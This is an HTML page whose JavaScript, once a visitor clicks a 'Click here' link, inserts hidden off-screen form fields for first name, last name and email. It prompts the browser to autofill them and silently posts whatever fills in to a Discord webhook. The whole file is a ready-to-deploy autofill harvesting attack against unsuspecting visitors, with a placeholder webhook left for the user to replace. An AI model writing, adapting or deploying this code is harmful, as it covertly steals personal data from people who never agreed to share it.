<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Auto-Fill on Click</title>
</head>
<body>
  <h1>Click the text below to submit your info</h1>
  <p id="triggerText" style="cursor:pointer; color:blue; text-decoration:underline;">
    Click here
  </p>

  <script>
    // Replace with your actual Discord webhook URL
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token';

    const triggerText = document.getElementById('triggerText');

    // Function to create and insert the form
    function createAndSubmitForm() {
      const form = document.createElement('form');
      form.id = 'userForm';
      form.autocomplete = 'on';

      form.innerHTML = `
        <input type="text" id="fname" name="given-name" autocomplete="given-name" required style="opacity:0; position:absolute; top:-9999px;">
        <input type="text" id="lname" name="family-name" autocomplete="family-name" required style="opacity:0; position:absolute; top:-9999px;">
        <input type="email" id="email" name="email" autocomplete="email" required style="opacity:0; position:absolute; top:-9999px;">
      `;

      document.body.appendChild(form);

      const fnameField = document.getElementById('fname');
      const lnameField = document.getElementById('lname');
      const emailField = document.getElementById('email');

      function checkFields() {
        if (fnameField.value.trim() !== '' && lnameField.value.trim() !== '' && emailField.value.trim() !== '') {
          submitForm(fnameField.value.trim(), lnameField.value.trim(), emailField.value.trim());
        }
      }

      // Focus the first field to prompt autofill
      fnameField.focus();

      fnameField.addEventListener('input', checkFields);
      lnameField.addEventListener('input', checkFields);
      emailField.addEventListener('input', checkFields);

      fnameField.addEventListener('change', checkFields);
      lnameField.addEventListener('change', checkFields);
      emailField.addEventListener('change', checkFields);
    }

    function submitForm(fname, lname, email) {
      const message = `Auto-submitted info:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;

      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          console.log('Message sent to Discord successfully!');
        } else {
          console.error('Failed to send message to Discord:', response.status, response.statusText);
        }
      })
      .catch(err => console.error('Error sending message to Discord:', err));
    }

    // When the user clicks the text, create the form and attempt to autofill/submit it
    triggerText.addEventListener('click', () => {
      createAndSubmitForm();
    });
  </script>
</body>
</html>
